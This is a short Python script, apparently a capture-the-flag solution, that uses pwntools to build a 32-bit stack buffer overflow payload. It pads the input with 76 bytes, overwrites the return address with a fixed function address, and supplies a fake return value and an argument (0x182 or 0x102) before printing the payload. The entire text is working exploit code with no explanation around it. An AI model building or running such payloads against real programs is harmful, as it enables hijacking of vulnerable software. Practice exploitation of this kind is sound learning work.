
from pwn import *
Payload = b''
Payload += b"A"*76
Payload += p32(0x8049196)
Payload += b"BBBB"
Payload += p32(0x182) #or we can use 0x102, either of these will work
print(Payload)
